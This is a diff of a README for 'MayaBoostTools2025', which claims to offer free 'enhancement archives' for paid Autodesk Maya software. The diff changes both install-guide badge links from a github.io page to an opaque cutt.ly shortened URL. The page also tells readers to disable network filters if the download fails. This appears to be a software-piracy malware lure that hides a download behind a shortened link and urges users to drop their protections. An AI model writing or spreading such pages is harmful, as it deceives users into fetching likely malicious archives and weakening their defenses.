@@ -6,7 +6,7 @@
 
 **About MayaBoostTools2025**: MayaBoostTools2025 is a repository for *Autodesk Maya* users on Windows, offering free enhancement archives to optimize your paid software. Download tools and guides to boost 3D animation and modeling. Supported by 70K+ visitors and 45K+ members, enhance your Maya experience in 2025!
 
-<a href="https://maya-enhance-collective.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/0rNtf71r" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -31,10 +31,9 @@ Enhance your *Autodesk Maya* with **MayaBoostTools2025** on Windows:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://maya-enhance-collective.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/0rNtf71r" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
-
 ---
 
 ## 🛠 Why MayaBoostTools2025?
